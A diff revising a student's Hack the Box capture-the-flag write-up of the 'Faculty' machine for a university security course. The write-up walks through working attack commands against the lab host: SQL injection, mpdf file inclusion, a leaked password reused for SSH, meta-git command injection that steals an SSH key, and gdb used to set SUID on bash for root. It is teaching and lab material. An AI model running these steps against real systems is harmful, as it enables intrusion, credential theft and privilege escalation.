@@ -1,25 +1,59 @@
 ---
-author: [Felicitas Pojtinger (fp036, Stuttgart Media University)]
+author: [Felicitas Pojtinger (fp036)]
 date: "2022-10-12"
-subject: "Hacking Report"
+subject: "Faculty Writeup"
 keywords: [hdm-stuttgart, hacking]
-subtitle: "Hack the Box: Faculty Machine"
 lang: en-US
-abstract: |
-  ## \abstractname{} {.unnumbered .unlisted}
-
-  Hacking Report for Winter 2022/2023. This is a preliminary version, as the machine will expire soon (on 2022-10-22) - the final report will be submitted before the submission deadline.
 csl: static/ieee.csl
+titlepage-background: docs/static/ics.pdf
+titlepage-text-color: FFFFFF
+titlepage-rule-height: 0
 ---
 
-# Uni Hacking Report
+# Faculty Writeup
 
-- **Machine**: Faculty (Medium; `10.10.11.169`, https://app.hackthebox.com/machines/Faculty)
+![Hack the Box Logo](static/htb.png)
+
+- **Author**: Felicitas Pojtinger (fp036)
+- **Dificulty**: Medium
+- **Target**: 10.10.11.169
 - **Proof of pwn**: [https://www.hackthebox.com/achievement/machine/370951/480](https://www.hackthebox.com/achievement/machine/370951/480)
 
-## Enumeration
+\newpage
 
-First, use `nmap` to get the services which are running:
+## Disclaimer
+
+I hereby confirm that I did not have any kind of assistance during the actual penetration test of the machine, nor with writing this writeup. All methods used are explained, all used resources are linked and ways of success and failure are described. This report was created as submission for HdM Stuttgart's "IT Security: Attack and Defense" course. Sharing or publishing this writeup without written approval is prohibited. There may be other ways to escalate this box and some ways may be patched now as they might not have been intentionally kept open by the box's authors. IPs and other metadata on screenshots and within the quoted and attached notes might differ, due to taking additional screenshots after the initial hacking.
+
+Contact: <fp036@hdm-stuttgart.de>
+
+\newpage
+
+## Preface and Personal Statement
+
+Faculty is a Linux-based machine created by HTB user `gbyolo`. It was originally published on July 2nd, 2022 and is rated at medium dificulty.
+
+The machine is CTF-like. This is mostly due to it running a fully custom, purpose-built software and it using some arcane tools to provide hints, such as the UNIX mail system. The custom software is written in PHP, which I used for projects at my job and has been used in quite a few machines we've worked on in the CTF team, which was nice to see.
+
+The user flag was pwned within roughly 4 days; this could have been done much more quickly, but lots of dead ends that seemed promising at first glance led to lots of time being wasted while trying to crack hashes. The root flag however was almost trivial to achieve and I managed to get it in under an hour, mostly because quite a lot of embedded Linux experience from my day job was applicable.
+
+Faculty is the first machine that I pwned fully by myself; all other machines were done within the HdM CTF team or with friends. The medium ranking felt appropriate, although the multiple dead ends were quite demotivating.
+
+\newpage
+
+## Skills Required
+
+In order to pwn the user flag, knowledge of Linux, a surface-level understanding of PHP, SQL injection and file inclusion is required. Once a shell has been acquired, remote code execution and the GNU Debugger help escalate to the root flag.
+
+## Conspectus
+
+Faculty exposes a custom PHP faculty scheduling system served by a Nginx webserver running on Ubuntu. Through fuzzing with `ffuf` we can find an admin area, which is vulnerable to SQL injection. Using `sqlmap`, the login form can be bypassed, after which access to a faculty list is granted. This list and others can be downloaded as a PDF; the used generator is an old version of `mpdf`, which has a file injection vulnerability. Using this vulnerability, we can fetch arbitray files from the server's filesystem. By causing the server to display a stack trace, we can get the app's source code directory, from which we first fetch the database connection file. It contains a hardcoded password and username, which are also both being used as the SSH credentials. Once SSH access is granted as user `gbyolo`, we can exploit a remote code execution vulnerability in the installed NPM package `meta-git` to escalate to user `developer` by downloading the relevant SSH private key and logging in over SSH again, which allows us to get the user flag. In order to get the root flag, we use a preinstalled version of `gdb` to attach to a process running as root with debug symbols enabled, and set the SUID bits of `bash`; this allows us to run bash as root and thus get the root flag.
+
+\newpage
+
+## Information Gathering
+
+First, I used `nmap` to get the services which are running on the machine:
 
 ```shell
 $ nmap -v -p- 10.10.11.169
@@ -35,28 +69,31 @@ Discovered open port 80/tcp on 10.10.11.169
 Discovered open port 22/tcp on 10.10.11.169
 ```
 
-Add the hostname to `/etc/hosts`:
+Both port 80 (HTTP) and 22 (SSH) are open.
+
+To access the services, I added the hostname to `/etc/hosts`:
 
 ```shell
 # /etc/hosts
 faculty.htb 10.10.11.169
 ```
 
-And do VHost and path fuzzing:
+After this, I used `ffuf` to fuzz the machine:
 
 ```shell
 $ ffuf -w ~/Downloads/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt:FUZZ -u http://10.10.11.169/ -H 'Host: FUZZ.faculty.htb' -fs 0,154
+# No results
 $ ffuf -w ~/Downloads/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://faculty.htb/FUZZ -fs 12193
 admin
 ```
 
 \newpage
 
-`/admin` looks like this:
+The `/admin` endpoint is interesting; it looks like this:
 
 ![Admin login](./static/admin-login.png)
 
-We find `/admin`, which we use `sqlmap` on to search for SQLi vulnerabilities:
+Next, I used `sqlmap` on the login page's API to search for SQL injection vulnerabilities:
 
 ```shell
 $ sqlmap -u 'http://faculty.htb/admin/ajax.php?action=login_faculty' --data="id_no=asdf" --method POST --dbs --batch -time-sec=1
@@ -70,7 +107,7 @@ available databases [2]:
 # ...
 ```
 
-Now we try to first enumerate the columns, then dump users:
+In order to find out more about the structure of the application, I used `sqlmap` to first enumerate the columns and then dump the users.
 
 ```shell
 $ sqlmap -u 'http://faculty.htb/admin/ajax.php?action=login_faculty' --data="id_no=asdf" --method POST --dbs --batch -time-sec=1 --columns --threads 10
@@ -105,7 +142,7 @@ Table: users
 +---------------+----------------------------------+
 ```
 
-Here we find an Administrator user as well the corresponding password hash. We can however not crack this hash, even with large password lists:
+Here an Administrator user as well the corresponding password hash could be found. This hash however did not seem to be easily crackable, even with large password lists:
 
 ```shell
 $ echo '1fecbe762af147c1176a0fc2c722a345' | tee /tmp/hash
@@ -121,7 +158,7 @@ $ hashcat -w 4 -a 0 /tmp/hash ~/Downloads/cyclone.hashesorg.hashkiller.combined.
 
 \newpage
 
-So we continue our search in the database and find faculty ID numbers, which we can use to login to the non-admin area, which looks like this:
+By continuing to dump the database and I was also able to find faculty ID numbers, which we can use to login to the non-admin area:
 
 ![Faculty login](./static/faculty-login.png)
 
@@ -148,7 +185,7 @@ Table: faculty
 +----------+
 ```
 
-When we look at the network inspector we find a RPC endpoint that is being called from this frontend. Running SQLMap on it shows another SQLi vulnerability, which we use to get all of the tables (its UNION instead of time-based like before, which makes this much faster). The page looks like this and the endpoint is used to fetch the schedules (notice the typo in the URL!):
+Looking at the network inspector we find a RPC endpoint that is being called from this frontend. Running SQLMap on it showed another SQL injection vulnerability, which we use to get all of the tables (its UNION instead of time-based like before, which makes this much faster). The page looked like this and the endpoint is used to fetch the schedules (notice the typo in the URL!):
 
 ![Faculty scheduling](./static/faculty-scheduling.png)
 
@@ -241,7 +278,7 @@ Table: schedules
 # ...
 ```
 
-Sadly, we can't use this path to escalate further either; we don't have the necessary permissions to get files using SQL:
+Sadly, I wasn't able to use this path to escalate further either; we don't have the necessary permissions to get files using SQL:
 
 ```shell
 $ sqlmap -u 'http://faculty.htb/admin/ajax.php?action=get_schecdule' --data="faculty_id=3" --method POST --dbs --batch -time-sec=1 --privileges
@@ -249,17 +286,19 @@ $ sqlmap -u 'http://faculty.htb/admin/ajax.php?action=get_schecdule' --data="fac
 privilege: USAGE
 ```
 
-So we take another look at the fuzzer from above, which gave us `/admin`.
+So I finally took one more look at the fuzzer from above, which gave us `/admin`.
 
 \newpage
 
 ## Exploitation
 
-For the actual exploitation, we use a SQL injection on `http://faculty.htb/admin` with the username (or password) `' OR 1=1#`, which evaluates the expression to always be true.
+For the actual exploitation, I used a SQL injection vulnerability on `http://faculty.htb/admin` with the username (or password) `' OR 1=1#`, which evaluates the expression to always be true.
 
 ![Faculty PDF generator](./static/faculty-pdf-generator.png)
 
-Here we find an endpoint that generates PDFs. Looking at the inspector we first `base64` decode and then URL decode (twice), which yields us the input: Plain HTML!:
+\newpage
+
+Here I found an endpoint that generates PDFs. Looking at the inspector we first `base64` decode and then URL decode (twice), which yields us the input: Plain HTML!:
 
 ![Faculty PDF content](./static/faculty-pdf-content.png)
 
@@ -268,7 +307,7 @@ $ function urldecode() { : "${*//+/ }"; echo -e "${_//%/\\x}"; }
 $ urldecode $(urldecode $(echo ${PARAM_FROM_POST_REQUEST} | base64 -d))
 ```
 
-We get the following result:
+This yielded the following result:
 
 ```html
 <h1><a name="top"></a>faculty.htb</h1>
@@ -337,7 +376,7 @@ We get the following result:
 </table>
 ```
 
-We can POST to this endpoint using cURL:
+I was able to POST to this endpoint using cURL:
 
 ```shell
 $ curl 'http://faculty.htb/admin/download.php' -H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.9,de;q=0.8' -H 'Connection: keep-alive' -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H 'Cookie: PHPSESSID=lbb7g4c7aqb8pjk8vo8g749ka3' -H 'Origin: http://faculty.htb' -H 'Referer: http://faculty.htb/admin/index.php?page=faculty' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36' -H 'X-Requested-With: XMLHttpRequest' --data-raw 'pdf=JTI1M0NoMSUyNTNFJTI1M0NhJTJCbmFtZSUyNTNEJTI1MjJ0b3AlMjUyMiUyNTNFJTI1M0MlMjUyRmElMjUzRWZhY3VsdHkuaHRiJTI1M0MlMjUyRmgxJTI1M0UlMjUzQ2gyJTI1M0VGYWN1bHRpZXMlMjUzQyUyNTJGaDIlMjUzRSUyNTNDdGFibGUlMjUzRSUyNTA5JTI1M0N0aGVhZCUyNTNFJTI1MDklMjUwOSUyNTNDdHIlMjUzRSUyNTA5JTI1MDklMjUwOSUyNTNDdGglMkJjbGFzcyUyNTNEJTI1MjJ0ZXh0LWNlbnRlciUyNTIyJTI1M0VJRCUyNTNDJTI1MkZ0aCUyNTNFJTI1MDklMjUwOSUyNTA5JTI1M0N0aCUyQmNsYXNzJTI1M0QlMjUyMnRleHQtY2VudGVyJTI1MjIlMjUzRU5hbWUlMjUzQyUyNTJGdGglMjUzRSUyNTA5JTI1MDklMjUwOSUyNTNDdGglMkJjbGFzcyUyNTNEJTI1MjJ0ZXh0LWNlbnRlciUyNTIyJTI1M0VFbWFpbCUyNTNDJTI1MkZ0aCUyNTNFJTI1MDklMjUwOSUyNTA5JTI1M0N0aCUyQmNsYXNzJTI1M0QlMjUyMnRleHQtY2VudGVyJTI1MjIlMjUzRUNvbnRhY3QlMjUzQyUyNTJGdGglMjUzRSUyNTNDJTI1MkZ0ciUyNTNFJTI1M0MlMjUyRnRoZWFkJTI1M0UlMjUzQ3Rib2R5JTI1M0UlMjUzQyUyNTJGdGJvYnklMjUzRSUyNTNDJTI1MkZ0YWJsZSUyNTNF' --compressed -L -vvv
@@ -358,7 +397,7 @@ This returns the ID, so we can the full path like so (the `mpdf/tmp/` path can b
 $ xdg-open "http://faculty.htb/mpdf/tmp/${ID}"
 ```
 
-This returns a PDF with the text "Hello, world!". MPDF has a file inclusion exploit ([https://www.exploit-db.com/exploits/50995](https://www.exploit-db.com/exploits/50995)), so let's try to get `/etc/passwd`:
+This returns a PDF with the text "Hello, world!". MPDF has a file inclusion exploit ([https://www.exploit-db.com/exploits/50995](https://www.exploit-db.com/exploits/50995)), so I was able to inject `/etc/passwd` into the generated PDF:
 
 ```shell
 $ cat <<EOT | jq -sRr @uri | base64 -w 0 > /tmp/body
@@ -412,7 +451,7 @@ usbmux:x:114:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
 
 As we can see, `gbyolo`, `developer` and `root` are our next targets because they have interactive shells.
 
-We can't find anything suspicious directly, so lets fetch the application source code to the host:
+I couldn't find anything else that was suspicious directly, so I processed to try and fetch the application source code to the host:
 
 ```shell
 $ ffuf -w ~/Downloads/SecLists/Discovery/Web-Content/raft-large-directories.txt:FUZZ -u http://faculty.htb/FUZZ -fs 12193
@@ -422,7 +461,7 @@ mpdf                    [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 2
 # ...
 ```
 
-Our first guess fails:
+The first guess fails:
 
 ```shell
 $ export FILE='/var/www/admin.php'
@@ -433,7 +472,7 @@ $ export ID=$(curl 'http://faculty.htb/admin/download.php' -H 'Accept: */*' -H '
 $ xdg-open "http://faculty.htb/mpdf/tmp/${ID}"
 ```
 
-Lets see if we can get a stacktrace to help us find the source code location:
+By ommiting parameters, I was able to display a stacktrace that helped finding the source code's location:
 
 ```shell
 $ curl 'http://faculty.htb/admin/ajax.php?action=login'   -H 'Accept: */*'   -H 'Accept-Language: en-US,en;q=0.9,de;q=0.8'   -H 'Connection: keep-alive'   -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8'   -H 'Cookie: PHPSESSID=lbb7g4c7aqb8pjk8vo8g749ka3'   -H 'Origin: http://faculty.htb'   -H 'Referer: http://faculty.htb/admin/login.php'   -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36'   -H 'X-Requested-With: XMLHttpRequest'   --data-raw 'idonotexist='   --compressed   --insecure
@@ -443,7 +482,7 @@ $ curl 'http://faculty.htb/admin/ajax.php?action=login'   -H 'Accept: */*'   -H 
 <b>Notice</b>:  Undefined variable: password in <b>/var/www/scheduling/admin/admin_class.php</b> on line <b>21</b><br />
 ```
 
-And fetch the file:
+This made it possible to fetch the file:
 
 ```shell
 $ export FILE='/var/www/scheduling/admin/admin_class.php'
@@ -454,7 +493,7 @@ $ export ID=$(curl 'http://faculty.htb/admin/download.php' -H 'Accept: */*' -H '
 $ xdg-open "http://faculty.htb/mpdf/tmp/${ID}"
 ```
 
-It returns in the attachment:
+It returned in the attachment:
 
 ```php
 <?php
@@ -477,7 +516,7 @@ Class Action {
 	# ...
 ```
 
-Let's look at `db_connect.php` to see if we can find the DB credentials:
+After this, I proceeded to look at the included `db_connect.php` file to search for DB credentials:
 
 ```shell
 export FILE='/var/www/scheduling/admin/db_connect.php'
@@ -488,7 +527,9 @@ export ID=$(curl 'http://faculty.htb/admin/download.php' -H 'Accept: */*' -H 'Ac
 xdg-open "http://faculty.htb/mpdf/tmp/${ID}"
 ```
 
-It returns:
+\newpage
+
+This returned:
 
 ```shell
 <?php
@@ -509,11 +550,11 @@ public mysqli::__construct(
 )
 ```
 
-So the user is `sched` and the password is `Co.met06aci.dly53ro.per`. Let see if the password matches for any of `gbyolo`, `developer` and `root` (`sched` isn't in `/etc/passwd`) next.
+So the user is `sched` and the password is `Co.met06aci.dly53ro.per`. After this, I proceeded to check if the password matches for any of `gbyolo`, `developer` and `root` (`sched` isn't in `/etc/passwd`) next.
 
 ## User Flag
 
-As we can see, the password matches for the user `gbyolo`:
+The password matched for the user `gbyolo`:
 
 ```shell
 $ ssh gbyolo@10.10.11.169
@@ -548,7 +589,7 @@ You have new mail.
 Last login: Thu Oct 13 20:33:26 2022 from 10.10.14.77
 ```
 
-We have a `mbox` file:
+There is a `mbox` file in the home directory:
 
 ```shell
 $ cat mbox
@@ -571,7 +612,7 @@ X-UID: 1
 Hi gbyolo, you can now manage git repositories belonging to the faculty group. Please check and if you have troubles just let me know!\ndeveloper@faculty.htb
 ```
 
-Since groups are mentioned - let's see how `sudo` has been configured:
+Since groups were mentioned, I checked how `sudo` has been configured:
 
 ```shell
 $ sudo -l
@@ -583,8 +624,7 @@ User gbyolo may run the following commands on faculty:
     (developer) /usr/local/bin/meta-git
 ```
 
-````shell
-As we can see, we can run `meta-git` as `developer`. `meta-git`, has a RCE vulnerability ([https://hackerone.com/reports/728040](https://hackerone.com/reports/728040)):
+I was able to run `meta-git` as `developer`. `meta-git`, has a RCE vulnerability ([https://hackerone.com/reports/728040](https://hackerone.com/reports/728040)):
 
 ```shell
 $ sudo -u developer meta-git clone 'asdf; ls'
@@ -603,9 +643,9 @@ ls: command 'git clone ls ls' exited with error: Error: Command failed: git clon
     at bootstrapNodeJSCore (internal/bootstrap/node.js:623:3)
 (node:63078) UnhandledPromiseRejectionWarning: Unhandled promise rejection. This error originated either by throwing inside of an async function without a catch block, or by rejecting a promise which was not handled with .catch(). (rejection id: 2)
 (node:63078) [DEP0018] DeprecationWarning: Unhandled promise rejections are deprecated. In the future, promise rejections that are not handled will terminate the Node.js process with a non-zero exit code.
-````
+```
 
-We can use this to read the SSH key:
+I was able to use this to read the SSH key:
 
 ```shell
 $ cd /tmp
@@ -655,7 +695,7 @@ YEeVKoox5zK4lPYIAgGJvhUTzSuu0tS8O9bGnTBTqUAq21NF59XVHDlX0ZAkCfnTW4IE7j
 # ...
 ```
 
-Let's add this SSH key to our local VM:
+I then proceeded to add this SSH key to my local VM:
 
 ```shell
 cat > ~/.ssh/id_rsa <<EOT
@@ -701,7 +741,7 @@ EOT
 chmod 600 ~/.ssh/id_rsa
 ```
 
-And we are in:
+And was able to log in:
 
 ```shell
 $ ssh developer@10.10.11.169
@@ -736,7 +776,9 @@ Last login: Thu Oct 13 11:05:59 2022 from 10.10.14.94
 developer
 ```
 
-We can now get the user flag:
+\newpage
+
+After this, I was able to get the user flag:
 
 ```shell
 $ cat user.txt
@@ -745,7 +787,7 @@ a2542ec10fe984b1113a65f53836ef66
 
 ## Root Flag
 
-Let's escalate to root. We have gdb on the host:
+In the user directory, a copy of gdb could be found:
 
 ```shell
 $ ls -la
@@ -766,7 +808,7 @@ drwxr-xr-x 2 developer developer    4096 Jun 23 18:50 .ssh
 -rw-r----- 1 root      developer      33 Oct 13 07:11 user.txt
 ```
 
-However this gdb is owned by `developer`; `/usr/bin/gdb` is accessible to us however:
+However this version gdb was owned by `developer`; `/usr/bin/gdb` was accessible to us however:
 
 ```shell
 $ ls -la /usr/bin/gdb
@@ -775,7 +817,7 @@ $ groups
 developer debug faculty
 ```
 
-Maybe we can take over one of the processes running as root and execute something:
+In the next step, I tried to take over one of the processes running as root and execute something:
 
 ```shell
 $ ps -U root -u root u
@@ -799,7 +841,7 @@ root       64031  0.0  0.4  13792  8984 ?        Ss   20:54   0:00 sshd: develop
 root       64307  0.0  0.0   4260   516 ?        S    20:58   0:00 sleep 20
 ```
 
-Let's choose Postfix:
+I chose Postfix:
 
 ```sh
 $ gdb -p 1572
@@ -827,21 +869,21 @@ Reading symbols from /usr/lib/debug/.build-id/45/87364908de169dec62ffa538170118c
 (gdb)
 ```
 
-We can now try and escalate with SUID (see https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/):
+I then tried to escalate by setting the SUID bits (see https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/):
 
 ```shell
 (gdb) call (void)system("chmod u+s /bin/bash")
 No symbol "system" in current context.
 ```
 
-But we can't, cause there are no debug symbols. Let's use a Python process instead:
+But wasn't able to, because there were no debug symbols. Python usually has them included:
 
 ```shell
 $ ps -U root -u root u | grep python
 root         719  0.0  0.8  26896 17940 ?        Ss   07:10   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
 ```
 
-And attach GDB, then run SUID bits for bash using the process running as root:
+Attaching GDB allowed for setting the SUID bits for bash using the process running as root:
 
 ```shell
 $ gdb -p 719
@@ -849,7 +891,7 @@ $ gdb -p 719
 [Detaching after vfork from child process 64874]
 ```
 
-Exit, and start bash:
+Upon exiting GDB, I was able to execute bash as root:
 
 ```shell
 $ bash -p
@@ -857,7 +899,7 @@ bash-5.0# whoami
 root
 ```
 
-There are some files in `/root`:
+Inspecting root's home directory yielded a few suspicious files, which is where the root flag could be found:
 
 ```shell
 # ls /root/
@@ -865,5 +907,3 @@ check_cron.sh  root.txt  service_check.sh
 # cat /root/root.txt
 b2107f909ec0fd1c66f1c9a1240c93ee
 ```
-
-And we have the root flag!
